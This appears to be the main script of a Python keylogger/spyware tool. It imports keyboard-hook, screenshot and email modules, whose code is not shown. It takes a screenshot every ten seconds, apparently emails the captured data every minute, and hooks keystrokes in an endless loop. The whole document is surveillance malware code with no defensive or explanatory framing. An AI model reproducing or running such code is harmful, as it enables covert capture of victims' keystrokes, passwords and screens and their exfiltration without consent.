import Hook_Keyboard
import PrintScreen
import Email_Connection
import schedule


schedule.every(10).seconds.do(PrintScreen.take_screen)
schedule.every(1).minutes.do(Email_Connection.sendmail)
while True:
    Hook_Keyboard.hook_keyboard()
    schedule.run_pending()



